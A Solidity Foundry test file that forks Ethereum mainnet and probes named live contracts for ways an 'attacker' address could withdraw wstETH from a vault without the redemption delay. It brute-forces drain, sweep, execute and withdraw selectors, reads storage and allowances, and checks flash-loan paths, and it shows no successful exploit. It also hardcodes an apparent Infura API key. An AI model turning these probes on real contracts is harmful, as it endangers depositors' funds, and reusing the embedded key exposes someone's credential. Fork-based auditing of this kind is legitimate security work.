// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

/**
 * Deep investigation of VAULT direct access paths
 * Looking for any way to pull wstETH without going through redemption delay
 */
contract VaultDirectAccess is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
    address constant SAFE = 0xd3E4C3552a3eEdA56c7A1d86768E67f7dcB2f25E;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_VaultFunctionEnumeration() public view {
        console.log("=== VAULT FUNCTION ENUMERATION ===\n");

        bytes memory vaultCode = address(VAULT).code;
        console.log("VAULT code size:", vaultCode.length);

        // Check if VAULT is a proxy
        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address vaultImpl = address(uint160(uint256(vm.load(VAULT, implSlot))));
        console.log("VAULT implementation (EIP-1967):", vaultImpl);

        bytes32 adminSlot = bytes32(uint256(0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103));
        address vaultAdmin = address(uint160(uint256(vm.load(VAULT, adminSlot))));
        console.log("VAULT admin (EIP-1967):", vaultAdmin);

        // Check owner
        (bool ownerSuccess, bytes memory ownerData) = VAULT.staticcall(abi.encodeWithSignature("owner()"));
        if (ownerSuccess && ownerData.length >= 32) {
            address owner = abi.decode(ownerData, (address));
            console.log("VAULT owner:", owner);
        }

        // Check known ERC4626 functions
        console.log("\n--- ERC4626 Function Checks ---");

        (bool hasAsset, bytes memory assetData) = VAULT.staticcall(abi.encodeWithSignature("asset()"));
        if (hasAsset && assetData.length >= 32) {
            address asset = abi.decode(assetData, (address));
            console.log("VAULT asset:", asset);
        }

        (bool hasTotalAssets, bytes memory totalAssetsData) = VAULT.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (hasTotalAssets && totalAssetsData.length >= 32) {
            uint256 total = abi.decode(totalAssetsData, (uint256));
            console.log("totalAssets:", total / 1e18, "wstETH");
        }

        // Check allowances
        uint256 rcAllowance = IERC20(wstETH).allowance(VAULT, RC);
        console.log("\nVAULT->RC wstETH allowance:", rcAllowance == type(uint256).max ? "UNLIMITED" : "LIMITED");
        console.log("RC address:", RC);
    }

    function test_VaultWithdrawFunctions() public {
        console.log("=== TESTING VAULT WITHDRAW FUNCTIONS ===\n");

        // Try various withdrawal function signatures
        bytes4[] memory withdrawSigs = new bytes4[](15);
        withdrawSigs[0] = bytes4(keccak256("withdraw(uint256)"));
        withdrawSigs[1] = bytes4(keccak256("withdraw(uint256,address)"));
        withdrawSigs[2] = bytes4(keccak256("withdraw(uint256,address,address)"));
        withdrawSigs[3] = bytes4(keccak256("redeem(uint256,address,address)"));
        withdrawSigs[4] = bytes4(keccak256("emergencyWithdraw()"));
        withdrawSigs[5] = bytes4(keccak256("rescue(address,uint256)"));
        withdrawSigs[6] = bytes4(keccak256("sweep(address)"));
        withdrawSigs[7] = bytes4(keccak256("claim()"));
        withdrawSigs[8] = bytes4(keccak256("exit()"));
        withdrawSigs[9] = bytes4(keccak256("withdrawAll()"));
        withdrawSigs[10] = bytes4(keccak256("transfer(address,uint256)"));
        withdrawSigs[11] = bytes4(keccak256("pull(address,uint256)"));
        withdrawSigs[12] = bytes4(keccak256("drain(address)"));
        withdrawSigs[13] = bytes4(keccak256("execute(address,bytes)"));
        withdrawSigs[14] = bytes4(keccak256("multicall(bytes[])"));

        vm.startPrank(attacker);

        for (uint256 i = 0; i < withdrawSigs.length; i++) {
            (bool success, bytes memory data) = VAULT.call{gas: 200000}(
                abi.encodeWithSelector(withdrawSigs[i], uint256(1e18), attacker, attacker)
            );
            if (success) {
                console.log("SUCCESS on selector:");
                console.logBytes4(withdrawSigs[i]);
            }
        }

        vm.stopPrank();

        console.log("No successful withdrawal function found via enumeration");
    }

    function test_RCTransferFromVault() public {
        console.log("=== RC TRANSFERFROM VAULT ===\n");

        // RC has unlimited allowance from VAULT
        // Can we somehow use RC to transferFrom VAULT to attacker?

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH:", vaultBalance / 1e18);

        // Check RC's functions
        console.log("\n--- RC Function Check ---");

        bytes memory rcCode = address(RC).code;
        console.log("RC code size:", rcCode.length);

        // RC is the implementation that R0 delegatecalls to
        // When called directly, it uses its OWN storage
        // RC's storage should have different values than R0

        // Check RC's slot 4 (delay in RC's storage)
        bytes32 rcSlot4 = vm.load(RC, bytes32(uint256(4)));
        console.log("RC slot 4:");
        console.logBytes32(rcSlot4);

        uint32 rcDelay = uint32(uint256(rcSlot4) >> 96);
        console.log("RC delay (its own storage):", rcDelay, "seconds");

        // But RC's vault reference might point somewhere useful
        bytes32 rcSlot3 = vm.load(RC, bytes32(uint256(3)));
        address rcVault = address(uint160(uint256(rcSlot3)));
        console.log("RC vault (slot 3):", rcVault);

        // If RC has a function that does transferFrom on vault...
        // Let's look at the finalizeRedeem flow more carefully

        console.log("\n--- Testing RC Direct Function Calls ---");

        // Try calling RC directly with various selectors
        bytes4[] memory rcSigs = new bytes4[](10);
        rcSigs[0] = bytes4(keccak256("finalizeRedeem(uint256)"));
        rcSigs[1] = bytes4(keccak256("pullFunds(address,uint256)"));
        rcSigs[2] = bytes4(keccak256("claimFunds()"));
        rcSigs[3] = bytes4(keccak256("transferFromVault(address,uint256)"));
        rcSigs[4] = bytes4(keccak256("sendToken(address,address,uint256)"));
        rcSigs[5] = bytes4(keccak256("sweep(address,address)"));
        rcSigs[6] = bytes4(keccak256("execute(bytes)"));
        rcSigs[7] = bytes4(keccak256("execSelector(bytes4,bytes)"));
        rcSigs[8] = bytes4(keccak256("withdrawFromVault(uint256)"));
        rcSigs[9] = bytes4(keccak256("claimWstETH()"));

        vm.startPrank(attacker);

        uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

        for (uint256 i = 0; i < rcSigs.length; i++) {
            (bool success, ) = RC.call{gas: 300000}(
                abi.encodeWithSelector(rcSigs[i], attacker, uint256(1e18))
            );
            if (success) {
                console.log("RC call succeeded for:");
                console.logBytes4(rcSigs[i]);
            }
        }

        uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("wstETH gained:", wstethAfter - wstethBefore);

        vm.stopPrank();
    }

    function test_TASsetAsVaultGateway() public {
        console.log("=== TASSET AS VAULT GATEWAY ===\n");

        // TASSET might have functions that interact with VAULT
        // Check if TASSET has any withdraw/redeem functions

        console.log("TASSET address:", TASSET);

        // Check TASSET functions
        (bool hasTotalAssets, bytes memory taData) = TASSET.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (hasTotalAssets && taData.length >= 32) {
            uint256 ta = abi.decode(taData, (uint256));
            console.log("TASSET.totalAssets:", ta / 1e18);
        }

        // Check if TASSET has an underlying vault reference
        (bool hasVault, bytes memory vaultData) = TASSET.staticcall(abi.encodeWithSignature("vault()"));
        if (hasVault && vaultData.length >= 32) {
            address v = abi.decode(vaultData, (address));
            console.log("TASSET.vault:", v);
        }

        // Check TASSET's implementation
        bytes32 implSlot = bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc));
        address tassetImpl = address(uint160(uint256(vm.load(TASSET, implSlot))));
        console.log("TASSET implementation:", tassetImpl);

        // Try withdraw/redeem on TASSET directly
        vm.startPrank(attacker);
        deal(TASSET, attacker, 10000e18);

        uint256 attackerWstethBefore = IERC20(wstETH).balanceOf(attacker);

        // Try ERC4626 redeem
        (bool redeemSuccess, ) = TASSET.call(
            abi.encodeWithSignature("redeem(uint256,address,address)", 1000e18, attacker, attacker)
        );
        console.log("TASSET.redeem success:", redeemSuccess);

        // Try withdraw
        (bool withdrawSuccess, ) = TASSET.call(
            abi.encodeWithSignature("withdraw(uint256,address,address)", 100e18, attacker, attacker)
        );
        console.log("TASSET.withdraw success:", withdrawSuccess);

        uint256 attackerWstethAfter = IERC20(wstETH).balanceOf(attacker);
        console.log("wstETH gained:", attackerWstethAfter - attackerWstethBefore);

        vm.stopPrank();
    }

    function test_VaultStorageAnalysis() public view {
        console.log("=== VAULT STORAGE DEEP DIVE ===\n");

        // Analyze VAULT storage to understand its structure
        console.log("--- First 20 storage slots ---");

        for (uint256 i = 0; i < 20; i++) {
            bytes32 slot = vm.load(VAULT, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);

                // Try to decode as address
                if (uint256(slot) < type(uint160).max) {
                    address decoded = address(uint160(uint256(slot)));
                    if (decoded.code.length > 0) {
                        console.log("  -> Likely contract:", decoded);
                    }
                }
            }
        }

        // Check who is authorized to withdraw from VAULT
        // Usually slot 0 or 1 is owner
        bytes32 slot0 = vm.load(VAULT, bytes32(uint256(0)));
        bytes32 slot1 = vm.load(VAULT, bytes32(uint256(1)));

        console.log("\nSlot 0 (potential owner):", address(uint160(uint256(slot0))));
        console.log("Slot 1:", address(uint160(uint256(slot1))));

        // Check allowances storage
        // ERC20 allowances mapping is usually at slot 1
        // allowance[VAULT][RC] should be stored at keccak256(RC, keccak256(VAULT, 1))
        bytes32 innerSlot = keccak256(abi.encode(VAULT, uint256(1)));
        bytes32 allowanceSlot = keccak256(abi.encode(RC, innerSlot));
        bytes32 allowanceValue = vm.load(wstETH, allowanceSlot);
        console.log("\nwstETH allowance VAULT->RC:");
        console.logBytes32(allowanceValue);
    }

    function test_ActionExecutorPath() public {
        console.log("=== ACTION EXECUTOR PATH ===\n");

        // Check if there's an action executor that could be exploited

        // Look for action registry or executor in the protocol
        (bool hasActionExecutor, bytes memory aeData) = R0.staticcall(abi.encodeWithSignature("actionExecutor()"));
        if (hasActionExecutor && aeData.length >= 32) {
            address ae = abi.decode(aeData, (address));
            console.log("Action executor:", ae);
        }

        // Check for any permissioned functions that could execute arbitrary actions
        console.log("\n--- Checking R0 for action execution paths ---");

        // Check slot 2 which might be action registry
        bytes32 slot2 = vm.load(R0, bytes32(uint256(2)));
        address slot2Addr = address(uint160(uint256(slot2)));
        console.log("R0 slot 2:", slot2Addr);

        if (slot2Addr.code.length > 0) {
            console.log("Slot 2 is a contract, code size:", slot2Addr.code.length);

            // Try execute function on it
            vm.startPrank(attacker);
            (bool execSuccess, ) = slot2Addr.call(
                abi.encodeWithSignature("execute(address,bytes)", wstETH, abi.encodeWithSignature("transfer(address,uint256)", attacker, 1e18))
            );
            console.log("Execute on slot2 contract success:", execSuccess);
            vm.stopPrank();
        }
    }

    function test_FlashLoanAttackPath() public {
        console.log("=== FLASH LOAN ATTACK PATH ===\n");

        // Check if protocol has any flash loan vulnerability
        // that could allow instant withdrawal

        // If VAULT accepts deposits and has a flash loan...
        (bool hasFlashLoan, ) = VAULT.staticcall(abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)"));
        console.log("VAULT has flashLoan:", hasFlashLoan);

        (bool hasMaxFlashLoan, bytes memory mflData) = VAULT.staticcall(abi.encodeWithSignature("maxFlashLoan(address)", wstETH));
        if (hasMaxFlashLoan && mflData.length >= 32) {
            uint256 maxFL = abi.decode(mflData, (uint256));
            console.log("VAULT maxFlashLoan:", maxFL / 1e18);
        }

        // Check if TASSET has flash loan capabilities
        (bool tassetFlash, ) = TASSET.staticcall(abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)"));
        console.log("TASSET has flashLoan:", tassetFlash);
    }

    function test_RCCreateDelegation() public {
        console.log("=== RC CREATE/DELEGATION ANALYSIS ===\n");

        // RC has CREATE2 capability from the bytecode we saw earlier
        // Can we somehow use this to our advantage?

        // The CREATE2 in RC might be for spawning child contracts
        // that have special privileges

        // Check if there's a factory pattern
        console.log("Checking for factory patterns in RC...");

        // Look at RC storage for any factory or child contract tracking
        for (uint256 i = 0; i < 10; i++) {
            bytes32 slot = vm.load(RC, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("RC slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check for any deployed child contracts at predictable addresses
        // CREATE2 address = keccak256(0xff ++ deployer ++ salt ++ keccak256(initCode))

        // We don't know the init code, but we can check if RC has deployed anything
        console.log("\nChecking RC for deployment tracking...");

        (bool hasGetPool, bytes memory poolData) = RC.staticcall(abi.encodeWithSignature("getPool(uint256)", 0));
        if (hasGetPool && poolData.length >= 32) {
            address pool = abi.decode(poolData, (address));
            console.log("RC.getPool(0):", pool);
        }
    }
}
